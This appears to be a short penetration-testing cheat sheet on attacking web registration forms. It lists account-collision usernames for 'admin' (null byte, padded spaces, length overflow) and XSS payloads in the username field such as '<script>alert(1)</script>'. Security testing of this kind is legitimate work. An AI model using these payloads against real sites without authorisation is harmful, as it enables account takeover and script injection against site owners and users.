## Register with the Same Username/Email Address as Existing User

We might be able to register the same username/email address as the existing user. It may affect the web server so be careful when testing.  
Here are examples of username to register.

```bash
admin
administrator
root
```

Alternatively, itâ€™s worth to try various approach to register.

```bash
# Insert null byte
admin%00

# Insert a space before username
 admin
%20admin

# Insert a space after username
admin 
admin%20

# Insert spaces around username
 admin 
%20admin%20

# Overflow (we need to find the longest characters that can be registered)
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxadmin
```

<br /><br />

## Username with XSS

We might be able to inject XSS in username when registration.  

```bash
john<script>alert(1)</script>
john</span><script>alert(1)</script>

# Overflow character length
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx<script>alert(1)</script>
```
